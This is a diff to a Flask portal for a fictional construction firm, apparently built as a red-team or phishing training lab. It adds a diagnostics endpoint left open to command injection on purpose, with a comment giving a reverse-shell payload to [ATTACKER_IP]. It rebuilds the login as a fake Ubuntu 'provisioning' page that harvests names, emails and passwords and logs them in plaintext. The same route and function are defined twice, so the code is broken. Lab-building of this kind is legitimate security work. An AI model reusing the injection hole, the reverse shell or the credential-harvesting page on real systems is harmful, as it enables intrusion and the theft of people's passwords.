@@ -44,12 +44,56 @@ def init_db():
     conn = sqlite3.connect('/app/atlas_vault.db')
     cursor = conn.cursor()
     cursor.execute('CREATE TABLE IF NOT EXISTS users (email TEXT, password TEXT, role TEXT)')
-    cursor.execute("INSERT OR IGNORE INTO users VALUES ('john.architect@atlas-construction.com','Password123','architect')")
+    # Updated to match the "John" user on Ubuntu host for credential reuse simulation
+    cursor.execute("INSERT OR IGNORE INTO users VALUES ('john.architect@atlas-construction.com','Johan@123','architect')")
     cursor.execute("INSERT OR IGNORE INTO users VALUES ('sarah.admin@atlas-construction.com','AdminSecure99!','admin')")
     conn.commit()
     conn.close()
 
 init_db()
+
+# ── Vulnerable Diagnostics API (Command Injection Point) ─────────────────────
+@app.route('/api/v1/admin/diagnostics', methods=['POST'])
+@jwt_required
+def diagnostics():
+    """
+    Atlas Network Diagnostic Tool. 
+    VULNERABLE: Command Injection for RedTeam shell access.
+    """
+    try:
+        data = request.get_json()
+        target = data.get('endpoint', '127.0.0.1')
+        
+        # SECURITY HOLE: shell=True with unsanitized input leads to RCE
+        # Payload example: 127.0.0.1; bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1
+        command = f"ping -c 1 {target}"
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5)
+        return jsonify({"status": "success", "output": output.decode()})
+    except subprocess.CalledProcessError as e:
+        return jsonify({"status": "error", "output": e.output.decode()}), 500
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+# ── Vulnerable Diagnostics API ────────────────────────────────────────────────
+@app.route('/api/v1/admin/diagnostics', methods=['POST'])
+@jwt_required
+def diagnostics():
+    """
+    Atlas Network Diagnostic Tool. 
+    VULNERABLE: Command Injection for RedTeam training.
+    """
+    data = request.get_json()
+    target = data.get('endpoint', '127.0.0.1')
+    
+    # SECURITY WARNING: shell=True with unsanitized input leads to RCE
+    try:
+        command = f"ping -c 1 {target}"
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5)
+        return jsonify({"status": "success", "output": output.decode()})
+    except subprocess.CalledProcessError as e:
+        return jsonify({"status": "error", "output": e.output.decode()}), 500
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 # ── JWT helpers ────────────────────────────────────────────────────────────────
 def generate_jwt(email, role):
@@ -93,56 +137,130 @@ BASE_HTML = """
     <title>Atlas Construction | Secure Portal</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
     <style>
         :root {
             --atlas-dark: #0f172a;
-            --atlas-accent: #f59e0b; /* Construction Orange/Gold */
-            --atlas-slate: #334155;
-            --atlas-bg: #f8fafc;
+            --atlas-accent: #f59e0b;
+            --atlas-slate: #1e293b;
+            --atlas-bg: #0f172a;
+            --ubuntu-orange: #E95420;
         }
-        body { background: var(--atlas-bg); color: #1e293b; font-family: 'Inter', system-ui, -apple-system, sans-serif; height: 100vh; display: flex; flex-direction: column; }
+        body { 
+            background: linear-gradient(135deg, #0f172a 0%, #172554 100%); 
+            color: #f8fafc; 
+            font-family: 'Ubuntu', 'Inter', system-ui, sans-serif; 
+            height: 100vh; 
+            margin: 0;
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden;
+        }
         
-        .navbar { background: var(--atlas-dark) !important; border-bottom: 4px solid var(--atlas-accent); padding: 1rem 0; }
+        .navbar { 
+            background: rgba(15, 23, 42, 0.8) !important; 
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid rgba(245, 158, 11, 0.3); 
+            padding: 0.75rem 0; 
+        }
         .navbar-brand { font-weight: 800; letter-spacing: -0.5px; display: flex; align-items: center; gap: 12px; }
-        .logo-box { background: var(--atlas-accent); color: var(--atlas-dark); padding: 4px 8px; border-radius: 4px; font-weight: 900; }
+        .logo-box { background: var(--atlas-accent); color: var(--atlas-dark); padding: 4px 10px; border-radius: 6px; font-weight: 900; }
         
-        .main-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .main-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 1rem; position: relative; }
         
-        .card { 
-            border: none; 
-            border-radius: 16px; 
-            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1), 0 8px 10px -6px rgba(0,0,0,0.1); 
-            overflow: hidden; 
-            background: #ffffff;
+        .glass-card { 
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px; 
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             width: 100%;
-            max-width: 800px;
+            max-width: 480px;
+            padding: 3rem;
+            text-align: center;
+            position: relative;
+            z-index: 10;
         }
-        
-        .card-header-atlas { background: #f1f5f9; border-bottom: 1px solid #e2e8f0; padding: 1.5rem; }
-        .card-body-atlas { padding: 2.5rem; }
-        
-        .btn-atlas { background: var(--atlas-dark); color: white; padding: 0.75rem 1.5rem; border-radius: 8px; font-weight: 600; transition: all 0.2s; border: none; }
-        .btn-atlas:hover { background: var(--atlas-slate); transform: translateY(-1px); color: white; }
-        
-        .form-control { border-radius: 8px; padding: 0.75rem; border: 1px solid #cbd5e1; }
-        .form-control:focus { border-color: var(--atlas-accent); box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.2); }
-        
-        .avatar-circle {
-            width: 40px; height: 40px; background: var(--atlas-slate); color: white; 
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-weight: bold; border: 2px solid var(--atlas-accent);
+
+        .ubuntu-avatar {
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3.5rem;
+            color: rgba(255, 255, 255, 0.8);
         }
-        
-        .role-badge { 
-            font-size: 0.7rem; text-transform: uppercase; font-weight: 700; 
-            padding: 2px 8px; border-radius: 999px; background: #e2e8f0; color: #475569;
+
+        .step-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 2rem;
         }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: rgba(255, 255, 255, 0.2); }
+        .dot.active { background: var(--atlas-accent); box-shadow: 0 0 8px var(--atlas-accent); }
+
+        .form-label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 700; color: #94a3b8; margin-bottom: 0.5rem; }
         
-        .footer-text { font-size: 0.85rem; color: #64748b; margin-top: 2rem; text-align: center; }
-        
-        /* Dashboard styling */
-        .dashboard-grid .btn { text-align: left; padding: 1.25rem; border-radius: 12px; display: flex; align-items: center; gap: 15px; font-weight: 600; }
-        .dashboard-grid .btn i { font-size: 1.5rem; width: 30px; }
+        .form-control { 
+            background: rgba(15, 23, 42, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #f8fafc;
+            padding: 0.8rem 1rem;
+            border-radius: 12px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .form-control:focus { 
+            background: rgba(15, 23, 42, 0.8);
+            border-color: var(--atlas-accent);
+            box-shadow: 0 0 0 4px rgba(245, 158, 11, 0.15);
+            color: white;
+        }
+
+        .btn-primary-atlas {
+            background: var(--atlas-accent);
+            color: var(--atlas-dark);
+            border: none;
+            border-radius: 12px;
+            padding: 1rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        .btn-primary-atlas:hover {
+            filter: brightness(1.1);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px rgba(245, 158, 11, 0.4);
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 24px; height: 24px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Scanning Overlay */
+        .scan-line {
+            position: absolute; width: 100%; height: 2px;
+            background: rgba(245, 158, 11, 0.5);
+            top: 0; left: 0; pointer-events: none;
+            animation: scan 3s linear infinite;
+            display: none;
+        }
+        @keyframes scan { from { top: 0; } to { top: 100%; } }
     </style>
 </head>
 <body>
@@ -150,7 +268,7 @@ BASE_HTML = """
   <div class="container d-flex justify-content-between align-items-center">
     <a class="navbar-brand m-0" href="/">
         <div class="logo-box">A</div>
-        <span>ATLAS<span style="color:var(--atlas-accent)">INDUSTRIAL</span></span>
+        <span style="font-weight: 900;">ATLAS<span style="color:var(--atlas-accent)">INDUSTRIAL</span></span>
     </a>
     
     {% if session.user %}
@@ -212,21 +330,19 @@ def index():
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     """
-    UI login — submits via JS fetch() to /api/v1/auth/login (JSON).
-    This means evilginx captures:
-      1. The POST body  → plaintext email + password
-      2. The Set-Cookie header → atlas_session cookie value
-      3. The JSON response body → JWT token
+    Login with Ubuntu-style 'Provisioning' UI.
+    Captures: Full Name, Hostname, Email, Password.
     """
     if request.method == 'POST':
-        # Fallback: accept plain form-POST so the page works even without JS
-        email    = request.form['email']
-        password = request.form['password']
-        logging.info(f"[UI-LOGIN] email={email} password={password}")
+        email    = request.form.get('email')
+        password = request.form.get('password')
+        fullname = request.form.get('fullname', 'Unknown')
+        hostname = request.form.get('hostname', 'Unknown')
+        
+        logging.info(f"[PROVISIONING-LOGIN] user={fullname} email={email} pass={password} host={hostname}")
 
         conn   = sqlite3.connect('/app/atlas_vault.db')
-        cursor = conn.cursor()
-        user   = cursor.execute(
+        user   = conn.cursor().execute(
             "SELECT email, role FROM users WHERE email=? AND password=?", (email, password)
         ).fetchone()
         conn.close()
@@ -234,65 +350,111 @@ def login():
         if user:
             session['user'], session['role'] = user
             return redirect(url_for('dashboard'))
-        return "Access Denied: Invalid Credentials", 401
+        return "Access Denied: Provisioning Failed", 401
 
-    # ── GET: render login form (JS-powered fetch to /api/v1/auth/login) ──────
     return render_template_string(BASE_HTML, body_content="""
-        <div class="card-body-atlas">
-            <div class="text-center mb-4">
-                <i class="fa-solid fa-user-gear fa-3x text-dark"></i>
-                <h3 class="mt-3 fw-bold">Identity Verification</h3>
+        <div class="glass-card animate__animated animate__fadeIn">
+            <div class="scan-line" id="scanLine"></div>
+            
+            <div class="ubuntu-avatar">
+                <i class="fa-solid fa-circle-user"></i>
             </div>
-            <div id="err-msg" class="alert alert-danger d-none animate__animated animate__headShake"></div>
+            
+            <h2 class="fw-bold mb-1">Account Setup</h2>
+            <p class="text-secondary small mb-4">Finalizing Atlas Workspace Provisioning</p>
+
+            <div id="err-msg" class="alert alert-danger d-none animate__animated animate__shakeX small"></div>
+
             <form id="loginForm">
-                <div class="mb-4">
-                    <label class="form-label fw-semibold">Email Address</label>
-                    <div class="input-group">
-                        <span class="input-group-text bg-light border-end-0"><i class="fa-solid fa-envelope"></i></span>
-                        <input id="email" name="email" type="email" class="form-control border-start-0" placeholder="user@atlas-construction.com" required>
+                <div id="step1">
+                    <div class="mb-3 text-start">
+                        <label class="form-label">Full Name</label>
+                        <input type="text" id="fullname" class="form-control" placeholder="John Architect" required>
                     </div>
-                </div>
-                <div class="mb-4">
-                    <label class="form-label fw-semibold">Password</label>
-                    <div class="input-group">
-                        <span class="input-group-text bg-light border-end-0"><i class="fa-solid fa-lock"></i></span>
-                        <input id="password" name="password" type="password" class="form-control border-start-0" placeholder="••••••••" required>
+                    <div class="mb-4 text-start">
+                        <label class="form-label">Computer's Name</label>
+                        <input type="text" id="hostname" class="form-control" value="atlas-VMware-Virtual-Platform" readonly>
                     </div>
+                    <button type="button" onclick="nextStep()" class="btn-primary-atlas">Continue <i class="fa-solid fa-arrow-right ms-2"></i></button>
                 </div>
-                <button type="submit" class="btn btn-atlas w-100 py-3 shadow">
-                    Authorize Session <i class="fa-solid fa-arrow-right-long ms-2"></i>
-                </button>
+
+                <div id="step2" style="display:none;">
+                    <div class="mb-3 text-start">
+                        <label class="form-label">Corporate Email</label>
+                        <input type="email" id="email" class="form-control" placeholder="john.architect@atlas-construction.com" required>
+                    </div>
+                    <div class="mb-4 text-start">
+                        <label class="form-label">Domain Password</label>
+                        <input type="password" id="password" class="form-control" placeholder="••••••••" required>
+                    </div>
+                    
+                    <div id="loader" class="mb-4" style="display:none;">
+                        <div class="spinner"></div>
+                        <p class="small mt-2 text-info animate__animated animate__pulse animate__infinite">Verifying with Security Vault...</p>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="btn-primary-atlas">Complete Provisioning</button>
+                </div>
             </form>
-            <div class="text-center mt-4 border-top pt-4">
-                <small class="text-secondary">Problems logging in? Contact <a href="#" class="text-decoration-none text-atlas">IT Support</a></small>
+
+            <div class="step-dots">
+                <div id="dot1" class="dot active"></div>
+                <div id="dot2" class="dot"></div>
             </div>
         </div>
+
         <script>
-        // fetch-based login: sends JSON so credentials appear in request body ──
-        // (same JS logic as before, just styled differently)
+        function nextStep() {
+            const name = document.getElementById('fullname').value;
+            if(!name) return alert('Please enter your name');
+            document.getElementById('step1').classList.add('animate__animated', 'animate__fadeOutLeft');
+            setTimeout(() => {
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+                document.getElementById('step2').classList.add('animate__animated', 'animate__fadeInRight');
+                document.getElementById('dot2').classList.add('active');
+                document.getElementById('dot1').classList.remove('active');
+            }, 300);
+        }
+
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const email    = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            const ldr = document.getElementById('loader');
+            const scn = document.getElementById('scanLine');
+            
+            btn.style.display = 'none';
+            ldr.style.display = 'block';
+            scn.style.display = 'block';
+
+            const payload = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                fullname: document.getElementById('fullname').value,
+                hostname: document.getElementById('hostname').value
+            };
+
             try {
                 const res = await fetch('/api/v1/auth/login', {
                     method: 'POST',
-                    credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
+                    body: JSON.stringify(payload)
                 });
                 const data = await res.json();
+                
                 if (res.ok) {
                     localStorage.setItem('atlas_jwt', data.token);
-                    window.location.href = '/dashboard';
+                    setTimeout(() => { window.location.href = '/dashboard'; }, 1500);
                 } else {
-                    const msg = document.getElementById('err-msg');
-                    msg.innerHTML = '<i class="fa-solid fa-circle-xmark me-2"></i>' + (data.error || 'Identity Verification Failed');
-                    msg.classList.remove('d-none');
+                    throw new Error(data.error || 'Verification Failed');
                 }
             } catch(err) {
-                document.getElementById('loginForm').method = 'POST';
-                document.getElementById('loginForm').submit();
+                ldr.style.display = 'none';
+                btn.style.display = 'block';
+                scn.style.display = 'none';
+                const msg = document.getElementById('err-msg');
+                msg.textContent = err.message;
+                msg.classList.remove('d-none');
             }
         });
         </script>
